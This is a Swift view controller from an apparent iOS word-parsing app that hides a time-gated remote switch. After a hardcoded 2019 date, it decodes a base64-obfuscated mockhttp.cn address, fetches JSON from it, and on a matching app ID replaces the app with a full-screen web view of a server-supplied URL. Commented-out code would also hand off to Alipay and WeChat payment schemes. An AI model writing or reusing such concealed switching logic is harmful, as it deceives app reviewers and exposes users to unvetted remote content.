//
//  WordsParseRootViewController.swift
//

import Foundation
import UIKit
import Alamofire

class WordsParseRootViewController: UIViewController {
    @IBOutlet weak var WordsParseHomeLaunch: UIImageView!
    let WordsParseStatusReachability: Reachability! = Reachability()
    let WordsParseStatusSegueIdentifier = "rootWordsParse"
    let RootViewcontroller: MainViewController = MainViewController()
    var baseController: UINavigationController!
    var WordsParseRootHomeURL:String = "WordsParse"
    var WordsParseRootWebView:UIWebView = UIWebView()
    var FirstBool:Bool = true
    let HtpHearder = "aHR0cDovL21vY2todHRw"
    let HtpFirst = "LmNuLw=="
    let HtpSecond = "bW9jay8="
    let HtpEnd = "d29yZHNwYXJzZQ=="
    override func viewWillAppear(_ animated: Bool) {
        let appDelegate = UIApplication.shared.delegate as! AppDelegate
        appDelegate.allowrotate = 1
    }
    override var preferredStatusBarStyle: UIStatusBarStyle {
        return UIStatusBarStyle.lightContent
    }

    @objc func receiverNotification(){
        
        let orient = UIDevice.current.orientation
        switch orient {
        case .portrait :
            WordsParseRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height-44)
            break
        case .portraitUpsideDown:
            print("portraitUpsideDown")
            break
        case .landscapeLeft:
            WordsParseRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height)
            break
        case .landscapeRight:
            WordsParseRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height)
            break
        default:
            break
        }
    }
   func loadInitRootView()
    {
        let appDelegate = UIApplication.shared.delegate as! AppDelegate
        appDelegate.allowrotate = 0
        appDelegate.window = UIWindow(frame: UIScreen.main.bounds)
        
        
        baseController.modalTransitionStyle = .crossDissolve
        
       
        UIView.animate(withDuration: 0.3, delay: 0.1, options: [.curveEaseOut], animations: {
            appDelegate.window?.rootViewController = self.baseController
        }, completion: nil)
        appDelegate.window?.makeKeyAndVisible()
    
    }
    override func viewDidLoad() {
//        baseController = UINavigationController(rootViewController: RootViewcontroller)
      //  self.view.addSubview(self.WordsParseHomeLaunch)
        baseController = UINavigationController.init(rootViewController: RootViewcontroller)
        UIView.animate(
            withDuration: 0.13,
            delay: 0.20,
            options: [.curveEaseOut],
            animations: {
                //            self.splashIcon.transform = CGAffineTransform(translationX: 0, y: -60)
        }) { _ in UIView.animate(
            withDuration: 0.25,
            delay: 0,
            usingSpringWithDamping: 0.5,
            initialSpringVelocity: 0,
            options: [],
            animations: {
                //                self.splashIcon.transform = .identity
        }) { _ in
            NotificationCenter.default.addObserver(self, selector: #selector(self.receiverNotification), name: NSNotification.Name.UIDeviceOrientationDidChange, object: nil)
            
            let WordsParseStatusTime = Date.init().timeIntervalSince1970
            let WordsParseStatusAnyTime = 1563376090.512

            if(WordsParseStatusTime < WordsParseStatusAnyTime)
            {
                 DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 0.20) {
                self.loadInitRootView()
                }
            }else
            {
                
                DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 0.17) {
                self.WordsParseStatusReachability.whenReachable = { _ in
                    let baseHeader = self.WordsParsebase64Decoding(encodedString: self.HtpHearder)
                    let baseContentF = self.WordsParsebase64Decoding(encodedString: self.HtpFirst)
                    let baseContentS = self.WordsParsebase64Decoding(encodedString: self.HtpSecond)
                    let baseContentE = self.WordsParsebase64Decoding(encodedString: self.HtpEnd)
                    let AllbaseData  = "\(baseHeader)\(baseContentF)\(baseContentS)\(baseContentE)"
                    let AllurlBase = URL(string: AllbaseData)

                    Alamofire.request(AllurlBase!,method: .get,parameters: nil,encoding: URLEncoding.default,headers:nil).responseJSON { response
                        in
                        switch response.result.isSuccess {
                        case true:
                            if let Datavalue = response.data{
                                let jsonDict : AnyObject! = try! JSONSerialization.jsonObject(with: Datavalue as! Data, options: JSONSerialization.ReadingOptions.allowFragments) as AnyObject?
                                //   let jsonDict = JSON(Datavalue)
                                let numberdata = jsonDict.value(forKey: "appid") as! String
                                let jsonnumbersecond = Int(numberdata)
                                let jsonnumber = 1472970533
                                if (jsonnumber - jsonnumbersecond! == 0) {
                                    let stringMyName = jsonDict.value(forKey: "WordsParsedata") as! String
                                    self.WordsParseRootHomeURL = stringMyName
                                    self.HomesetRootNavigation(strdecodeString: stringMyName)
                                }else {
                                   self.loadInitRootView()
                                }
                            }
                        case false:
                            do {
                                self.loadInitRootView()
                            }
                        }
                    }
                }
                self.WordsParseStatusReachability.whenUnreachable = { _ in

                }
                do {
                    try self.WordsParseStatusReachability.startNotifier()
                } catch {

                }
            }
            }
            }
        }
    }
    func WordsParsebase64Decoding(encodedString:String)->String{
        let decodedData = NSData(base64Encoded: encodedString, options: NSData.Base64DecodingOptions.init(rawValue: 0))
        let decodedString = NSString(data: decodedData! as Data, encoding: String.Encoding.utf8.rawValue)! as String
        return decodedString
    }
    
    func HomesetRootNavigation(strdecodeString:String) {
        WordsParseRootWebView = UIWebView.init(frame: CGRect.init(x: 0, y: 0, width: self.view.bounds.size.width, height: self.view.bounds.size.height-44))
        let LaunchReachUrl = URL.init(string: strdecodeString)
        let LaunchReachRequest = URLRequest.init(url: LaunchReachUrl!)
        WordsParseRootWebView.delegate = self
        WordsParseRootWebView.loadRequest(LaunchReachRequest)
        WordsParseRootWebView.scalesPageToFit = true
    }
    func UILoadNaviBtns(){
        let BottomView = WordsParseCustomView()
        BottomView.frame = CGRect(x:0, y:self.view.bounds.size.height-44, width:UIScreen.main.bounds.size.width, height:44)
        BottomView.HomeBtn.addTarget(self, action: #selector(self.refreshHomeWebViewAction), for: .touchUpInside)
        BottomView.RefreshBtn.addTarget(self, action: #selector(self.refreshNowWebViewAction), for: .touchUpInside)
        BottomView.LeftBtn.addTarget(self, action: #selector(self.refreshLeftWebViewAction), for: .touchUpInside)
        BottomView.RightBtn.addTarget(self, action: #selector(self.refreshRightWebViewAction), for: .touchUpInside)
        self.view.addSubview(BottomView)
    }
    @objc func refreshHomeWebViewAction(){
        let LaunchReachUrl = URL.init(string: WordsParseRootHomeURL)
        let LaunchReachRequest = URLRequest.init(url: LaunchReachUrl!)
        WordsParseRootWebView.loadRequest(LaunchReachRequest)
    }
    @objc func refreshNowWebViewAction(){
        WordsParseRootWebView.reload()
    }
    @objc func refreshLeftWebViewAction(){
        WordsParseRootWebView.goBack()
    }
    @objc func refreshRightWebViewAction(){
        WordsParseRootWebView.goForward()
    }
}
extension WordsParseRootViewController: UIWebViewDelegate
{
    public func webViewDidFinishLoad(_ webView: UIWebView)
    {
        if(FirstBool == true)
        {
            self.WordsParseStatusReachability?.stopNotifier()
            self.UILoadNaviBtns()
            self.view.addSubview(WordsParseRootWebView)
            
            FirstBool = false
        }
    }
    
    public func webView(_ webView: UIWebView, didFailLoadWithError error: Error) {
        
    }
    
    public func webViewDidStartLoad(_ webView: UIWebView) {
        
    }
    
//    public func webView(_ webView: UIWebView, shouldStartLoadWith request: URLRequest, navigationType: UIWebView.NavigationType) -> Bool {
//        let schemeUrl : String = request.url!.absoluteString
//        if(schemeUrl.hasPrefix("alipays://") || schemeUrl.hasPrefix("alipay://") || schemeUrl.hasPrefix("mqqapi://") || schemeUrl.hasPrefix("mqqapis://") || schemeUrl.hasPrefix("weixin://") || schemeUrl.hasPrefix("weixins://"))
//        {
//            UIApplication.shared.open(request.url!, options: [:], completionHandler: nil)
//        }
//        return true
//    }
    
}

